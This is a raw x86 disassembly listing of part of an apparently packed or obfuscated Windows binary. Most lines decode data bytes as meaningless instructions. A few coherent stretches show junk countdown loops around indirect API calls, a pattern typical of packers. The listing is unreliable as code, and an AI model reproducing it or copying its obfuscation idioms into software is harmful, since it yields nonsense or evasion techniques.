  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0x44e0,0x50
  4063d1:	das    
  4063d2:	xchg   ebx,eax
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x4063ce
  4063dc:	sub    DWORD PTR [eax-0x4e],ebx
  4063df:	xchg   edi,eax
  4063e0:	add    al,0x59
  4063e2:	push   DWORD PTR [eax+0x4d]
  4063e5:	mov    ebx,0x4ac05184
  4063ea:	mov    bl,0x16
  4063ec:	xor    BYTE PTR [ebx-0xbd898e3],ah
  4063f2:	test   edx,esi
  4063f4:	sub    BYTE PTR [ebx-0x1b],bh
  4063f7:	outs   dx,BYTE PTR ds:[esi]
  4063f8:	cld    
  4063f9:	dec    ebx
  4063fa:	push   esp
  4063fb:	adc    edx,esp
  4063fd:	lock mov ds:0x5a1b1d1a,eax
  406403:	ja     0x406443
  406405:	add    eax,0xa19888a0
  40640a:	adc    DWORD PTR [edi-0x75],ebx
  40640d:	out    0x4a,eax
  40640f:	xchg   edx,eax
  406410:	jp     0x40644f
  406412:	sub    esp,esi
  406414:	add    bl,dh
  406416:	jge    0x406423
  406418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406419:	popf   
  40641a:	mov    ecx,0x596c87e1
  40641f:	add    BYTE PTR [edi+0x2c],ch
  406422:	mov    bl,BYTE PTR [esi+0x524b4a90]
  406428:	sbb    al,BYTE PTR [ecx+0x51ac9014]
  40642e:	not    DWORD PTR [ecx+ecx*4]
  406431:	mov    ecx,0x48096f4f
  406436:	jge    0x406454
  406438:	push   cs
  406439:	pop    ss
  40643a:	adc    BYTE PTR [ebx],dl
  40643c:	inc    esp
  40643d:	and    eax,0xdff445f4
  406442:	cmc    
  406443:	mov    al,bh
  406445:	ficomp DWORD PTR [esi+0x2a2c9dad]
  40644b:	mov    esp,0x95455766
  406450:	mov    ch,0x3d
  406452:	rcr    DWORD PTR [esi+edi*1],0x58
  406456:	push   edi
  406457:	scas   eax,DWORD PTR es:[edi]
  406458:	fmul   DWORD PTR [ecx+ebp*1]
  40645b:	fwait
  40645c:	mov    bl,0x13
  40645e:	stos   BYTE PTR es:[edi],al
  40645f:	jg     0x40645f
  406461:	push   ecx
  406462:	stos   BYTE PTR es:[edi],al
  406463:	call   0xf613:0xb4cd17c6
  40646a:	ins    DWORD PTR es:[edi],dx
  40646b:	adc    al,0x1b
  40646d:	mov    ah,BYTE PTR [ebp+eax*1+0x39]
  406471:	adc    ebx,DWORD PTR [eax]
  406473:	sub    al,0x6f
  406475:	or     DWORD PTR ds:0xee9fc387,0x57
  40647c:	sub    ch,BYTE PTR [ebx+0x5f]
  40647f:	cld    
  406480:	cdq    
  406481:	scas   al,BYTE PTR es:[edi]
  406482:	sbb    bh,bh
  406484:	in     al,dx
  406485:	add    eax,0x9a15af0a
  40648a:	dec    eax
  40648b:	in     eax,0xec
  40648d:	es in  eax,0x3f
  406490:	xor    al,BYTE PTR [ecx-0x3a2c059c]
  406496:	jecxz  0x4064bb
  406498:	sar    DWORD PTR [esi+0x4],cl
  40649b:	retf   0xb225
  40649e:	repnz cmc 
  4064a0:	test   esp,ecx
  4064a2:	pop    ebx
  4064a4:	mov    ds:0x3e183f15,al
  4064a9:	popf   
  4064aa:	std    
  4064ab:	push   eax
  4064ac:	iret   
  4064ad:	loop   0x40651c
  4064af:	add    al,0x70
  4064b1:	sub    bl,0x46
  4064b4:	rcl    DWORD PTR [ebx+ecx*8+0x316b6545],0x73
  4064bc:	in     eax,0xd5
  4064be:	nop
  4064bf:	push   edi
  4064c0:	lahf   
  4064c1:	dec    esi
  4064c2:	pushf  
  4064c3:	mov    al,BYTE PTR [edx]
  4064c5:	pop    ss
  4064c6:	push   0xf2203fe9
  4064cb:	(bad)  
  4064cc:	ins    DWORD PTR es:[edi],dx
  4064cd:	in     eax,0x9e
  4064cf:	mov    eax,ds:0x1386cf1d
  4064d4:	jnp    0x40652e
  4064d6:	and    esi,DWORD PTR [eax-0x72c9fe2a]
  4064dc:	fs dec edx
  4064de:	retf   
  4064df:	gs in  al,0x3c
  4064e2:	ret    0x9aef
  4064e5:	push   0x5a
  4064e7:	inc    esp
  4064e8:	sbb    esi,DWORD PTR [eax]
  4064ea:	(bad)  
  4064eb:	shr    BYTE PTR [edx+0x63],1
  4064ee:	mov    dl,0x5e
  4064f0:	sbb    edx,DWORD PTR [ebx+0x638185d5]
  4064f6:	div    DWORD PTR [ecx]
  4064f8:	bnd jno 0x406534
  4064fb:	and    eax,0x61f8bfa7
  406500:	mov    edx,0xa9a8ee07
  406505:	je     0x4064a8
  406507:	in     al,0x24
  406509:	dec    ecx
  40650a:	in     al,dx
  40650b:	into   
  40650c:	aas    
  40650d:	test   al,ah
  40650f:	(bad)  
  406510:	in     eax,dx
  406511:	fcmovb st,st(6)
  406513:	xchg   esi,eax
  406514:	adc    DWORD PTR [esi-0x66],eax
  406517:	mov    ?,esi
  406519:	arpl   dx,bp
  40651b:	loopne 0x40650c
  40651d:	ins    DWORD PTR es:[edi],dx
  40651e:	add    bl,al
  406520:	pop    edx
  406521:	clc    
  406522:	mov    ecx,gs
  406524:	clc    
  406525:	sub    al,0x8f
  406527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406528:	ins    DWORD PTR es:[edi],dx
  406529:	and    al,BYTE PTR [edx+0x14]
  40652c:	pop    esp
  40652d:	sbb    ch,BYTE PTR [esi-0x42]
  406530:	es es pop ecx
  406533:	mov    edx,0x8661fd6
  406538:	mov    dh,0x67
  40653a:	xchg   esp,eax
  40653b:	test   al,0xb9
  40653d:	mov    bh,bl
  40653f:	les    edx,FWORD PTR [edx]
  406541:	dec    edi
  406542:	out    dx,al
  406543:	mov    edx,0x3f5d9698
  406548:	xor    BYTE PTR [ecx+0x37],ah
  40654b:	dec    edx
  40654c:	sub    al,0x97
  40654e:	mov    eax,ds:0x321e22ec
  406553:	xchg   ecx,eax
  406554:	inc    esp
  406555:	jp     0x406513
  406557:	pop    ebp
  406558:	sbb    BYTE PTR [ebx-0x40],bl
  40655b:	sbb    al,0x8f
  40655d:	leave  
  40655e:	clc    
  40655f:	sti    
  406560:	(bad)  
  406562:	fisubr DWORD PTR [ebp-0x1e]
  406565:	cdq    
  406566:	fwait
  406567:	pop    ebp
  406568:	lods   eax,DWORD PTR ds:[esi]
  406569:	jnp    0x406561
  40656b:	jmp    0xe3d0:0xf661e377
  406572:	leave  
  406573:	xchg   ebp,eax
  406574:	mov    edi,0x64f8f2d1
  406579:	pushf  
  40657a:	dec    edi
  40657b:	push   cs
  40657c:	outs   dx,DWORD PTR ds:[esi]
  40657d:	sbb    DWORD PTR ds:0xe13e700b,0xffffffdb
  406584:	imul   ebp,edi,0xffffff8b
  406587:	test   BYTE PTR [ebx+0x2c],dh
  40658a:	lods   al,BYTE PTR ds:[esi]
  40658b:	push   edx
  40658c:	sub    al,0x60
  40658e:	inc    edx
  40658f:	js     0x40659c
  406591:	cmp    al,0x48
  406593:	sbb    eax,0xf4248e4d
  406598:	mov    dh,BYTE PTR [ebx+0x55e18ab4]
  40659e:	outs   dx,BYTE PTR ds:[esi]
  40659f:	cmp    al,0xe
  4065a1:	std    
  4065a2:	dec    ebx
  4065a3:	cmp    edi,ebx
  4065a5:	push   ecx
  4065a6:	ja     0x406587
  4065a8:	ret    
  4065a9:	or     eax,edx
  4065ab:	mov    dh,BYTE PTR [ebx-0x6a]
  4065ae:	adc    eax,ecx
  4065b0:	push   bp
  4065b2:	pop    ss
  4065b3:	(bad)  
  4065b4:	in     eax,0x61
  4065b6:	call   0x404d49
  4065bb:	test   eax,eax
  4065bd:	je     0x4065e8
  4065c3:	lea    eax,[ebp-0x78]
  4065c6:	push   eax
  4065c7:	mov    eax,DWORD PTR [ebp-0x14]
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0x728328c3]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x4065fc
  40660b:	dec    ebx
  40660c:	jnp    0x406684
  40660e:	cmp    eax,0x7658e491
  406613:	mov    esp,0x167c8661
  406618:	xor    BYTE PTR [esi-0x109e964c],bh
  40661e:	jb     0x40667e
  406620:	sbb    bh,0xef
  406623:	idiv   esp
  406625:	lea    esp,[edx+0x292207d3]
  40662b:	sbb    ebx,esi
  40662d:	cmp    eax,0xf0656061
  406632:	xor    DWORD PTR ds:0xd97a3e6,0x69
  406639:	mov    BYTE PTR [edi],bl
  40663b:	jne    0x4065f9
  40663d:	push   ebp
  40663e:	(bad)  
  40663f:	call   DWORD PTR [eax-0x69]
  406642:	jne    0x406616
  406644:	mov    bh,0x6f
  406646:	xchg   BYTE PTR [ebx],al
  406648:	call   0xd19f:0x1df6a84d
  40664f:	les    ebp,FWORD PTR [edx+0x2f]
  406652:	sbb    al,0xdf
  406654:	fwait
  406655:	sub    eax,0xb10ba573
  40665a:	pop    edi
  40665b:	push   esi
  40665c:	cmp    BYTE PTR [eax+eax*1-0x43a5f5f3],bh
  406663:	push   esi
  406664:	or     BYTE PTR [ebx+0x39],0x67
  406668:	inc    edi
  406669:	js     0x406664
  40666b:	cld    
  40666c:	pop    esp
  40666d:	or     cl,dh
  40666f:	adc    al,0x54
  406671:	push   edi
  406672:	retf   0xa73c
  406675:	jmp    0x6f40:0xf2f07133
  40667c:	sbb    ch,ah
  40667e:	mov    ch,0x25
  406680:	lods   eax,DWORD PTR ds:[esi]
  406681:	xchg   edi,edx
  406683:	popa   
  406684:	xlat   BYTE PTR ds:[ebx]
  406685:	xchg   ecx,eax
  406686:	clc    
  406687:	fbstp  TBYTE PTR [edi+0x612c97aa]
  40668d:	inc    esi
  40668e:	aaa    
  40668f:	and    dl,bl
  406691:	in     eax,dx
  406692:	ins    BYTE PTR es:[edi],dx
  406693:	mov    edi,0x89f39675
  406698:	std    
  406699:	popf   
  40669a:	cmc    
  40669b:	dec    edx
  40669c:	fsubr  QWORD PTR [edx-0x49382cbc]
  4066a2:	push   ecx
  4066a3:	sub    ecx,edi
  4066a5:	jge    0x406719
  4066a7:	mov    ah,0xdc
  4066a9:	je     0x406685
  4066ab:	jge    0x4066c7
  4066ad:	cmp    BYTE PTR [ecx],dl
  4066af:	xchg   esi,eax
  4066b0:	outs   dx,BYTE PTR ds:[esi]
  4066b1:	xchg   edi,eax
  4066b2:	mov    eax,ds:0xc6f6a07a
  4066b7:	xor    al,0x22
  4066b9:	xor    dl,BYTE PTR [ecx+0x4609c6b1]
  4066bf:	dec    ecx
  4066c0:	retf   0x1bf1
  4066c3:	mov    dh,0xd5
  4066c5:	shr    edx,cl
  4066c7:	push   edi
  4066c8:	mov    al,ds:0x9d302ec9
  4066cd:	mov    ch,0x3d
  4066cf:	sub    eax,0x1beb9fd8
  4066d4:	and    BYTE PTR ds:0xe4430055,0xdd
  4066db:	outs   dx,BYTE PTR ds:[esi]
  4066dc:	mov    ds:0xf39deb3d,al
  4066e1:	xor    edi,esp
  4066e3:	cmp    eax,eax
  4066e5:	dec    esi
  4066e6:	sub    DWORD PTR [esi-0x210812c3],ecx
  4066ec:	not    BYTE PTR [edx]
  4066ee:	imul   eax,DWORD PTR [edx+edx*8+0x63],0x2d
  4066f3:	out    0xd3,al
  4066f5:	mov    eax,0xd44ddbaa
  4066fa:	mov    es,esp
  4066fc:	ss and eax,0xa935336a
  406702:	enter  0x3be6,0xb9
  406706:	stc    
  406707:	je     0x4066d4
  406709:	mov    DWORD PTR [eax-0x57b85877],esp
  40670f:	inc    esp
  406710:	ins    BYTE PTR es:[edi],dx
  406711:	sbb    eax,0xf5608769
  406716:	mov    bh,0xa
  406718:	sbb    eax,esi
  40671a:	push   esp
  40671b:	inc    esp
  40671c:	sbb    cl,BYTE PTR [ebp+esi*8+0x6db73234]
  406723:	pop    esi
  406724:	shl    BYTE PTR [ecx],1
  406726:	test   al,0x19
  406728:	fistp  DWORD PTR [edi-0x5d]
  40672b:	iret   
  40672c:	gs clc 
  40672e:	push   ds
  40672f:	adc    cl,BYTE PTR ds:0x65d0c4dc
  406735:	mov    ebp,0x22797f6d
  40673a:	mov    esi,0xe5cf6630
  40673f:	xchg   edi,eax
  406740:	cmp    bl,BYTE PTR [ecx+ecx*1-0x4810ccfd]
  406747:	mov    ds:0x528a64b9,eax
  40674c:	mov    dh,0x37
  40674e:	mov    ecx,db1
  406751:	icebp  
  406752:	and    DWORD PTR [edx-0x47b79061],ebx
  406758:	jne    0x4067a5
  40675a:	imul   edx,esi,0xdcc47dd5
  406760:	je     0x40679e
  406762:	test   DWORD PTR [ebp+0x2c],ebp
  406765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406766:	les    ebp,FWORD PTR [ebx-0x3]
  406769:	retf   
  40676a:	shl    dh,0xf5
  40676d:	outs   dx,BYTE PTR ds:[esi]
  40676e:	sar    bh,cl
  406770:	aad    0xa2
  406772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406773:	adc    BYTE PTR [esi+edx*4+0x10],dh
  406777:	shr    DWORD PTR [eax],0x40
  40677a:	pop    ebx
  40677b:	add    DWORD PTR [eax-0x2a],0x93163a89
  406782:	or     eax,0xa69ad7a9
  406787:	mov    bl,0x61
  406789:	jb     0x406755
  40678b:	jmp    0x4067af
  40678d:	daa    
  40678e:	daa    
  40678f:	mov    al,0x5a
  406791:	pop    es
  406792:	fistp  DWORD PTR [ebx+0x6b]
  406795:	jo     0x4067e8
  406797:	retf   0x1c0d
  40679a:	mov    ds:0x8d2ccbb7,al
  40679f:	aad    0x0
  4067a1:	jo     0x4067b1
  4067a3:	cdq    
  4067a4:	lahf   
  4067a5:	mov    al,ds:0xe4d0ff38
  4067aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067ab:	jo     0x406730
  4067ad:	xlat   BYTE PTR ds:[ebx]
  4067ae:	add    BYTE PTR [eax+0x62edf58d],al
  4067b4:	xlat   BYTE PTR ds:[ebx]
  4067b5:	stos   DWORD PTR es:[edi],eax
  4067b6:	push   0x24
  4067b8:	jmp    0x9d6b:0xa438d9ca
  4067bf:	adc    ch,dh
  4067c1:	or     eax,0x463b4db8
  4067c6:	ins    BYTE PTR es:[edi],dx
  4067c7:	add    BYTE PTR [esi+0x4db53e8e],0x4d
  4067ce:	jp     0x40683f
  4067d0:	(bad)  
  4067d1:	cmp    eax,0x1656602
  4067d6:	jg     0x4067e6
  4067d8:	sbb    al,0xfe
  4067da:	out    0x61,al
  4067dc:	cli    
  4067dd:	retf   0x2b7c
  4067e0:	mov    bh,0x98
  4067e2:	jle    0x4067cd
  4067e4:	push   ecx
  4067e5:	mov    eax,0xffcd8d65
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0x495f:0x12cff6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	mov    ecx,0x8fe1c4ac
  406869:	loope  0x406866
  40686b:	push   DWORD PTR [eax]
  40686d:	jg     0x406881
  40686f:	out    0xbc,eax
  406871:	stos   DWORD PTR es:[edi],eax
  406872:	inc    esi
  406873:	pop    edi
  406874:	inc    eax
  406875:	add    ebx,ebp
  406877:	cmp    BYTE PTR [ecx-0x2],dh
  40687a:	daa    
  40687b:	sbb    dx,sp
  40687e:	jno    0x40687e
  406880:	pop    ss
  406881:	sub    eax,DWORD PTR [esi-0x3fec16b0]
  406887:	out    dx,al
  406888:	jl     0x406855
  40688a:	jp     0x406836
  40688c:	lea    ebx,[eax]
  40688e:	pop    esi
  40688f:	je     0x4068f1
  406891:	das    
  406892:	hlt    
  406893:	ficomp DWORD PTR [esi+edx*4+0x2e]
  406897:	test   eax,0x85607bba
  40689c:	enter  0xd475,0x5a
  4068a0:	adc    bl,BYTE PTR gs:[esi+0x3513f63f]
  4068a7:	jae    0x40688f
  4068a9:	push   ecx
  4068aa:	(bad)  
  4068ab:	retf   0xabc7
  4068ae:	sbb    edx,edi
  4068b0:	mov    al,0xe9
  4068b2:	cmc    
  4068b3:	outs   dx,DWORD PTR ds:[esi]
  4068b4:	push   esi
  4068b5:	add    DWORD PTR ds:0x1397f28d,eax
  4068bb:	mov    ?,WORD PTR [esi+0x61]
  4068be:	pop    es
  4068bf:	mov    esp,DWORD PTR [edi]
  4068c1:	jmp    0x406893
  4068c3:	push   es
  4068c4:	sar    BYTE PTR [ebx],1
  4068c6:	and    eax,0xc6e2ce2e
  4068cb:	xlat   BYTE PTR ds:[ebx]
  4068cc:	fisubr WORD PTR [esi-0x1c2573ff]
  4068d2:	xor    BYTE PTR [esi+0x1f],0xa4
  4068d6:	sub    BYTE PTR [ebp-0x4f],0xd8
  4068da:	call   0xeccd:0x3378c92a
  4068e1:	fwait
  4068e2:	dec    eax
  4068e3:	ror    DWORD PTR [ecx],1
  4068e5:	mov    ecx,0x2af99994
  4068ea:	or     DWORD PTR [ecx+eiz*4-0x4e],esp
  4068ee:	prefetch BYTE PTR [edx+ecx*2-0x285f7c9f]
  4068f6:	mov    bh,0xe6
  4068f8:	dec    edi
  4068f9:	aam    0xad
  4068fb:	xchg   ebx,eax
  4068fc:	in     al,dx
  4068fd:	mov    esp,0x45a88a5e
  406902:	dec    BYTE PTR [ecx-0x1]
  406905:	inc    edi
  406906:	inc    edi
  406907:	dec    esp
  406908:	mov    al,0x48
  40690a:	loope  0x406909
  40690c:	sub    BYTE PTR [esi+0x3],al
  40690f:	popa   
  406910:	iret   
  406911:	jge    0x40690a
  406913:	mov    eax,fs
  406915:	dec    ebx
  406916:	leave  
  406917:	in     eax,dx
  406918:	add    eax,0x6a16c90e
  40691d:	pop    edx
  40691e:	rcl    BYTE PTR [edi+edi*2],1
  406921:	pop    esi
  406922:	ret    
  406923:	ss ret 
  406925:	push   edx
  406926:	sbb    al,0xae
  406928:	std    
  406929:	icebp  
  40692a:	fadd   QWORD PTR [esi+0x12]
  40692d:	stos   DWORD PTR es:[edi],eax
  40692e:	cwde   
  40692f:	xor    eax,edx
  406931:	int    0x79
  406933:	inc    esi
  406934:	(bad)  
  406935:	jno    0x4068fc
  406937:	repnz xor al,bh
  40693a:	cmp    DWORD PTR [eax-0xa],edi
  40693d:	leave  
  40693e:	imul   ebp,DWORD PTR [esi+0x715aca4e],0xdc3ac77d
  406948:	pop    edi
  406949:	out    0x9e,eax
  40694b:	lahf   
  40694c:	sbb    BYTE PTR [eax+edi*1-0x7c],0x92
  406951:	sbb    BYTE PTR [eax],al
  406953:	jns    0x406972
  406955:	enter  0x1edc,0x67
  406959:	jmp    0x4068db
  40695b:	(bad)  
  40695c:	push   ebx
  40695d:	mov    WORD PTR [eax],ss
  40695f:	dec    ebx
  406960:	adc    bl,0x16
  406963:	inc    ecx
  406964:	das    
  406965:	mov    dh,0x3b
  406967:	push   ebx
  406968:	xchg   edx,eax
  406969:	in     eax,0xd3
  40696b:	(bad)  
  40696c:	lods   eax,DWORD PTR ds:[esi]
  40696d:	ret    
  40696e:	loop   0x4069b5
  406970:	dec    esi
  406971:	cmp    ebp,ecx
  406973:	xchg   edi,eax
  406974:	repz cwde 
  406976:	jns    0x4069dc
  406978:	js     0x40697c
  40697a:	repz mov WORD PTR [edx],fs
  40697d:	cld    
  40697e:	mov    al,ds:0xe6ab34b3
  406983:	inc    ebx
  406984:	or     dh,al
  406986:	mov    dl,BYTE PTR [ebp-0x52]
  406989:	push   ss
  40698a:	jge    0x4069a6
  40698c:	js     0x406932
  40698e:	sbb    eax,0x284f8129
  406993:	cli    
  406994:	push   0xc0c7b458
  406999:	seta   BYTE PTR [ecx+0x30]
  40699d:	out    0xc7,al
  40699f:	push   edi
  4069a0:	sub    eax,0x30b8f8fb
  4069a5:	ror    bl,cl
  4069a7:	inc    esi
  4069a8:	pop    ecx
  4069a9:	and    al,0x10
  4069ab:	leave  
  4069ac:	std    
  4069ad:	xor    al,0x2a
  4069af:	add    DWORD PTR [ebp-0x72],0xd8b3d44b
  4069b6:	in     eax,dx
  4069b7:	adc    al,0xee
  4069b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069ba:	xchg   ebx,eax
  4069bb:	sub    al,0xd0
  4069bd:	fsub   DWORD PTR [eax]
  4069bf:	inc    ecx
  4069c0:	mov    eax,0x84be3120
  4069c5:	mov    esi,0x9f2f366
  4069ca:	jmp    0x4069ad
  4069cc:	sub    al,cl
  4069ce:	pop    ebp
  4069cf:	xlat   BYTE PTR ds:[ebx]
  4069d0:	test   ebp,0xad584a5b
  4069d6:	fcmovbe st,st(7)
  4069d8:	rcr    eax,cl
  4069da:	push   ebx
  4069db:	sub    dl,BYTE PTR [ebx]
  4069dd:	jns    0x4069b9
  4069df:	push   edi
  4069e0:	jbe    0x406a3a
  4069e2:	fisttp WORD PTR [esi-0x7f]
  4069e5:	sbb    eax,0x64dcea9a
  4069ea:	inc    ebx
  4069eb:	mov    ds:0xffb5bdc4,al
  4069f0:	or     al,0x4b
  4069f2:	jle    0x4069c3
  4069f4:	(bad)  
  4069f5:	mov    esi,0x42f7923d
  4069fa:	pop    ebx
  4069fb:	retf   0x23ec
  4069fe:	(bad)  
  4069ff:	xlat   BYTE PTR ds:[ebx]
  406a00:	outs   dx,BYTE PTR ds:[esi]
  406a01:	or     eax,0x10f348df
  406a06:	mov    ss,esi
  406a08:	adc    ecx,edi
  406a0a:	adc    ebp,DWORD PTR [edi+0x76a9ab15]
  406a10:	mov    dl,0xa4
  406a12:	push   ds
  406a13:	or     BYTE PTR [edi],ah
  406a15:	push   eax
  406a16:	jge    0x406a11
  406a18:	jno    0x406a5e
  406a1a:	clc    
  406a1b:	mov    esi,0x8485e34b
  406a20:	popa   
  406a21:	(bad)  
  406a22:	lock sub ah,BYTE PTR [ecx+0x0]
  406a26:	fdivr  st,st(0)
  406a28:	push   ss
  406a29:	xor    eax,0x7c7f3a2c
  406a2e:	mov    eax,ds:0xb66578f1
  406a33:	call   0xf09c:0x846e20b2
  406a3a:	pushf  
  406a3b:	imul   ecx,DWORD PTR [edx+0x19],0x50ff58c1
  406a42:	add    DWORD PTR [ebx+0xd8be045],ecx
  406a48:	and    al,0x22
  406a4a:	inc    ecx
  406a4b:	add    BYTE PTR [ecx],al
  406a4d:	or     BYTE PTR [edi+0x5e],bl
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ede3,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ede3,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ede3,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ec1b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ede3
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ede3,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x4304e7
  406aa5:	xor    edi,DWORD PTR ds:0x430435
  406aab:	mov    DWORD PTR ds:0x4304e7,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x43045d,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x43045d
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x43045d,ecx
  406ad3:	cmp    DWORD PTR ds:0x43045d,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e8b7
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ec1f
  406af9:	cmp    DWORD PTR ds:0x43045d,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x4304df,0x15
  406b1d:	cmp    DWORD PTR ds:0x4304df,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x4304df,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e9df
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x4304df
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x4304df,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x430435,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x4304d7,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x4304d7
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x4304d7,ecx
  406b87:	cmp    DWORD PTR ds:0x4304d7,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x4304d7,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e7e6
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42eaa7
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e7c8
  406bcd:	add    DWORD PTR ds:0x43043d,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42edcb
  406bdf:	and    edi,DWORD PTR ds:0x4304e3
  406be5:	mov    DWORD PTR ds:0x42edcb,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0xa337504
  406bfe:	jmp    0x8a7e:0x7e3a6507
  406c05:	jg     0x406c85
  406c07:	jle    0x406c38
  406c09:	mov    edx,0x8c814765
  406c0e:	nop
  406c0f:	shr    DWORD PTR [edi-0x7a],0xf2
  406c13:	scas   al,BYTE PTR es:[edi]
  406c14:	fisub  DWORD PTR [edx]
  406c16:	cli    
  406c17:	cld    
  406c18:	lds    edx,FWORD PTR [ebx+0x34bc5bf4]
  406c1e:	cmp    eax,0x635d895c
  406c23:	in     eax,0x78
  406c25:	daa    
  406c26:	inc    ecx
  406c27:	pop    edx
  406c28:	ror    BYTE PTR [ebp-0x13],cl
  406c2b:	xchg   edx,eax
  406c2c:	jle    0x406c5f
  406c2e:	fist   DWORD PTR [edi+edi*2+0x32aebdb3]
  406c35:	push   0x56
  406c37:	push   ecx
  406c38:	mov    dh,0x15
  406c3a:	jmp    0x5921:0x3e6108be
  406c41:	retf   0xfda5
  406c44:	shl    DWORD PTR [ebx+edi*8+0x25b097b6],1
  406c4b:	sub    DWORD PTR [esi],ecx
  406c4d:	add    eax,0xec01a5bd
  406c52:	in     eax,0x7f
  406c54:	(bad)  
  406c56:	hlt    
